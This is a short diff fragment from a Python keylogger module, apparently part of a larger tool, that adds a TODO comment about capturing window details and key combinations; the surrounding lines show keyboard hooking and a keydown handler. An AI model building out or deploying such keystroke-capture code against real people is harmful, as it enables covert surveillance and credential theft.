@@ -21,6 +21,8 @@ class KeyloggerModule(AbstractModule):
             self._hooks_manager.HookKeyboard()
             pythoncom.PumpMessages()
 
+    # TODO This is a very simply implementation, we have to gather more info about the window AND take care of
+    # key combinations (ie copy & paste and uppercase)
     def _keydown(self, event):
         ignore = [0, 27]
 
